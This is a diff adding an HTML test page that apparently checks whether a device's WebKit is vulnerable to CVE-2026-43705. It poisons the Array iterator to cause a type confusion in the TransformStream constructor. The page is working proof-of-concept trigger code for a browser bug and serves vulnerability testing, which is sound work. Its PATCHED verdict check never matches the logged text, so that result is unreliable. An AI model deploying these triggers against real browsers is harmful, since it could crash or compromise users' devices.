@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CVE-2026-43705 - Lightweight Test</title>
+<style>
+body { background: #000; color: #0f0; font-family: monospace; font-size: 16px; padding: 20px; }
+h1 { color: #ff0; }
+.pass { color: #0f0; font-weight: bold; }
+.fail { color: #f00; font-weight: bold; }
+.crash { color: #f0f; font-weight: bold; }
+.info { color: #0ff; }
+</style>
+</head>
+<body>
+<h1>CVE-2026-43705 - Quick Test</h1>
+<hr>
+<div id="log"></div>
+<script>
+var el = document.getElementById('log');
+function log(m, c) {
+    var d = document.createElement('div');
+    d.className = c || '';
+    d.textContent = m;
+    el.appendChild(d);
+}
+
+var origIter = Array.prototype[Symbol.iterator];
+
+// === TEST 1: Normal TransformStream (control) ===
+log('Test 1: Normal TransformStream...', 'info');
+try {
+    var ts = new TransformStream();
+    log('PASS: Normal TransformStream works', 'pass');
+} catch(e) {
+    log('FAIL: Normal TransformStream broken: ' + e, 'fail');
+}
+
+// === TEST 2: Poison iterator - plain objects ===
+log('Test 2: Poisoned iterator (plain objects)...', 'info');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        var a = this, i = 0;
+        return { next: function() {
+            if (i >= a.length) return {done:true};
+            var v = a[i];
+            if (a.length === 3 && i >= 1) v = {fake:true};
+            i++;
+            return {value:v, done:false};
+        }};
+    };
+    var ts2 = new TransformStream();
+    log('FAIL: No exception - unpatched but no crash on plain objects', 'fail');
+} catch(e) {
+    if (e instanceof TypeError) {
+        log('PASS: TypeError thrown (PATCHED)', 'pass');
+    } else {
+        log('CRASH-CAUGHT: ' + e.constructor.name, 'crash');
+    }
+}
+Array.prototype[Symbol.iterator] = origIter;
+
+// === TEST 3: Poison iterator - ArrayBuffer pointer ===
+log('Test 3: Poisoned iterator (ArrayBuffer ptr)...', 'info');
+try {
+    var buf = new ArrayBuffer(256);
+    Array.prototype[Symbol.iterator] = function() {
+        var a = this, i = 0;
+        return { next: function() {
+            if (i >= a.length) return {done:true};
+            var v = a[i];
+            if (a.length === 3 && i >= 1) v = {pad:0, ptr:buf};
+            i++;
+            return {value:v, done:false};
+        }};
+    };
+    var ts3 = new TransformStream();
+    log('CRASH-SURVIVED: Type confusion succeeded without crash!', 'crash');
+    try {
+        log('ts3.readable type: ' + typeof ts3.readable, 'info');
+    } catch(e2) {
+        log('Accessing .readable crashed: ' + e2.constructor.name, 'crash');
+    }
+} catch(e) {
+    if (e instanceof TypeError) {
+        log('PASS: TypeError thrown (PATCHED)', 'pass');
+    } else {
+        log('CRASH-CAUGHT: ' + e.constructor.name, 'crash');
+    }
+}
+Array.prototype[Symbol.iterator] = origIter;
+
+// === TEST 4: Truncated iterator ===
+log('Test 4: Truncated iterator...', 'info');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        return { next: function() { return {done:true}; } };
+    };
+    var ts4 = new TransformStream();
+    log('CRASH-SURVIVED: Truncated iterator succeeded!', 'crash');
+} catch(e) {
+    if (e instanceof TypeError) {
+        log('PASS: TypeError thrown (PATCHED)', 'pass');
+    } else {
+        log('CRASH-CAUGHT: ' + e.constructor.name, 'crash');
+    }
+}
+Array.prototype[Symbol.iterator] = origIter;
+
+// === SUMMARY ===
+log('', 'info');
+log('=== RESULT ===', 'info');
+var results = el.textContent;
+if (results.indexOf('CRASH-CAUGHT') >= 0 || results.indexOf('CRASH-SURVIVED') >= 0) {
+    log('VULNERABLE: CVE-2026-43705 is exploitable on this firmware!', 'crash');
+} else if (results.indexOf('TypeError (PATCHED)') >= 0 && results.indexOf('FAIL') < 0) {
+    log('PATCHED: WebKit has the fix for CVE-2026-43705', 'pass');
+} else {
+    log('INCONCLUSIVE: Check results above', 'fail');
+}
+</script>
+</body>
+</html>
